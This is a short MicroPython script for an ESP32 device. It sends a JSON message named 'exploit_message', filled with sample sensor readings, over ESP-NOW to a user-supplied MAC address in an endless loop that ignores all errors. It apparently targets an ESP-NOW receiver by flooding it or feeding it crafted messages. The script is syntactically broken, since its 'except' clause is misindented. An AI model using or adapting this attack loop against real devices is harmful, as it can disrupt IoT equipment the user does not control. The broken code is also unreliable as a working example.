import network
import espnow
import ujson
print('Paste server MAC address:')
address = input()
exploit_message_dict = {
  "nu": 12345,
  "timestamp": "2024-05-18T12:00:00",
  "data": {
    "temperature": 25.6,
    "humidity": 60.2,
    "pressure": 1013.25,
    "status": "OK",
    "location": {
      "latitude": 40.7128,
      "longitude": -74.0060
    },
    "sensor_readings": [18.5, 19.2, 20.0, 18.8, 19.1]
  }
}
exploit_message = ujson.dumps(exploit_message_dict)
peer = bytes.fromhex(address.replace(':', ''))
sta = network.WLAN(network.STA_IF)
sta.active(True)
e = espnow.ESPNow().active(True)
e.add_peer(peer)
print("Type WiFi channel number: ")
channel = input()
sta.config(channel=int(channel))
while True:
    try:
        e.send(peer, exploit_message, True)
except:
        pass
